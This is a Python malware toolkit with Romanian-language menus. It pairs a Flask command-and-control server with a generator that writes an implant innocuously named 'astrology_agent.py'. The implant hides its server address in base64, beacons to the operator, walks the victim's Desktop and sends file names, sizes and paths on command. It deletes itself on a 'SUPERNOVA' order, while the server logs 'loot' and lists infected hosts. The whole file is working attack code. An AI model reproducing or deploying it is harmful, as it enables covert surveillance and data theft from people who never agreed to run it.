import argparse
import threading
import time
import os
import sys
import socket
import base64
import json
import logging
from flask import Flask, request, jsonify


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)


SERVER_STATE = {
    "command": "ECLIPSE",     
    "last_loot": None,        
    "nodes": {}               
}

LOOT_FILE = "loot_data.log"


@app.route('/telemetry/heartbeat', methods=['POST'])
def heartbeat():
    content = request.json
    node = content.get('node', 'unknown')
    
    
    SERVER_STATE["nodes"][node] = time.time()
    
    
    if 'data' in content and content['data']:
        try:
            encoded_data = content['data']
            decoded = base64.b64decode(encoded_data).decode('utf-8')
            timestamp = time.strftime("%H:%M:%S")
            entry = f"[{timestamp}] NODE: {node} | DATA: {decoded}"
            
            with open(LOOT_FILE, "a") as f:
                f.write(entry + "\n")
            SERVER_STATE["last_loot"] = entry
        except:
            pass

    return jsonify({"status": "ok", "constellation_state": SERVER_STATE["command"]})

def run_flask(port):
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)


def generate_payload(ip, port):
    print(f"[*] Generare Agent pentru {ip}:{port}...")
    enc_config = base64.b64encode(f"http://{ip}:{port}/telemetry/heartbeat".encode()).decode()
    
    payload = f"""
import os, time, base64, requests, socket, json, sys

CFG = "{enc_config}"
def get_url(): return base64.b64decode(CFG).decode('utf-8')

def run():
    url = get_url()
    host = socket.gethostname()
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop): desktop = os.getcwd()
    
    file_gen = os.walk(desktop)
    curr_root, _, curr_files = next(file_gen, (None, None, []))
    idx = 0

    while True:
        try:
            
            resp = requests.post(url, json={{"node": host}}, timeout=3)
            cmd = resp.json().get('constellation_state', 'ECLIPSE')

            if cmd == 'SUPERNOVA':
                try: os.remove(sys.argv[0])
                except: pass
                sys.exit()

            elif cmd == 'ECLIPSE':
                time.sleep(5)
                continue

            elif cmd == 'ZENITH':
                if curr_root and idx < len(curr_files):
                    fpath = os.path.join(curr_root, curr_files[idx])
                    idx += 1
                    try:
                        sz = os.stat(fpath).st_size
                        data = json.dumps({{"file": curr_files[idx-1], "size": sz, "path": fpath}})
                        enc = base64.b64encode(data.encode()).decode()
                        requests.post(url, json={{"node": host, "data": enc}}, timeout=2)
                    except: pass
                else:
                    try:
                        curr_root, _, curr_files = next(file_gen)
                        idx = 0
                    except:
                        file_gen = os.walk(desktop)
                time.sleep(1)

        except:
            time.sleep(5)

if __name__ == '__main__':
    time.sleep(2)
    run()
"""
    with open("astrology_agent.py", "w") as f:
        f.write(payload.strip())
    print("\033[92m[+] Agent generat: astrology_agent.py\033[0m")


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print("""\033[91m         o                      o                                                     
        <|>                    <|>                                                    
        / \                    < >                                                    
      o/   \o       \o__ __o    |         o__ __o/  \o__ __o     o__  __o       __o__ 
     <|__ __|>       |     |>   o__/_    /v     |    |     |>   /v      |>     />  \  
     /       \      / \   / \   |       />     / \  / \   < >  />      //      \o     
   o/         \o    \o/   \o/   |       \      \o/  \o/        \o    o/         v\    
  /v           v\    |     |    o        o      |    |          v\  /v __o       <\   
 />             <\  / \   / \   <\__     <\__  / \  / \          <\/> __/>  _\o__</   
""")

def show_satellites():

    print_banner()
    print("\033[94m[ ORBITAL TRACKING SYSTEM ]\033[0m")
    print(f"{'HOSTNAME':<20} | {'LAST SEEN':<10} | {'STATUS'}")
    print("-" * 50)
    
    current_time = time.time()
    active_count = 0
    
    if not SERVER_STATE["nodes"]:
        print("No satellites detected yet.")
    
    for node, last_seen in SERVER_STATE["nodes"].items():
        delta = int(current_time - last_seen)
        
        
        if delta < 15:
            status = "\033[92mONLINE (Stable)\033[0m"
            active_count += 1
        elif delta < 60:
            status = "\033[93mUNSTABLE\033[0m"
        else:
            status = "\033[91mLOST SIGNAL\033[0m"
            
        print(f"{node:<20} | {delta}s ago    | {status}")
    
    print("-" * 50)
    print(f"Total Active Satellites: \033[92m{active_count}\033[0m")
    input("\n[Apasa Enter pentru a reveni la Meniu]")

def live_monitor_mode():
    SERVER_STATE["command"] = "ZENITH"
    print_banner()
    print("\033[92m[+] CANAL DESCHIS: 'ZENITH'. Satelitii trimit date...\033[0m")
    print("\033[90m[Apasa Ctrl+C pentru a opri receptia]\033[0m\n")
    
    if not os.path.exists(LOOT_FILE): open(LOOT_FILE, 'w').close()
    f = open(LOOT_FILE, "r")
    f.seek(0, 2)
    
    try:
        while True:
            line = f.readline()
            if line: print(line.strip())
            else: time.sleep(0.5)
    except KeyboardInterrupt:
        SERVER_STATE["command"] = "ECLIPSE"
        print("\n\033[93m[!] Canal inchis. Revenire la ECLIPSE.\033[0m")
        time.sleep(2)

def main_menu(port):
    while True:
        print_banner()
        
        active = sum(1 for t in SERVER_STATE['nodes'].values() if time.time() - t < 15)
        
        print(f"Server IP: \033[94m0.0.0.0:{port}\033[0m")
        print(f"Ordin Curent: \033[93m{SERVER_STATE['command']}\033[0m")
        print(f"Sateliți Activi: \033[92m{active}\033[0m")
        print("-" * 40)
        print("1. \033[92m[START]\033[0m Extrage Stele (ZENITH)")
        print("2. \033[94m[VIEW]\033[0m  Jurnal Astral (ECLIPSE)")
        print("3. \033[91m[KILL]\033[0m  Autodistrugere  (Supernova)")
        print("4. \033[96m[STATUS]\033[0m Lista Sateliti Conectati")
        print("5. [EXIT]  Oprește Serverul")
        
        choice = input("\nSelect > ")
        
        if choice == '1': live_monitor_mode()
        elif choice == '2':
            print("\n--- LOOT DATA ---")
            if os.path.exists(LOOT_FILE):
                with open(LOOT_FILE, 'r') as f: print(f.read())
            else: print("[!] Gol.")
            input("\n[Enter]")
        elif choice == '3':
            if input("Confirmati stergerea agentilor? (y/n): ").lower() == 'y':
                SERVER_STATE["command"] = "SUPERNOVA"
                time.sleep(5)
                SERVER_STATE["command"] = "ECLIPSE"
        elif choice == '4':
            show_satellites()
        elif choice == '5':
            os._exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--mode', choices=['server', 'gen'], required=True)
    parser.add_argument('--set-ip', type=str, default='127.0.0.1')
    parser.add_argument('--set-port', type=int, default=8080)
    args = parser.parse_args()

    if args.mode == 'gen':
        generate_payload(args.set_ip, args.set_port)
    elif args.mode == 'server':
        t = threading.Thread(target=run_flask, args=(args.set_port,))
        t.daemon = True
        t.start()
        main_menu(args.set_port)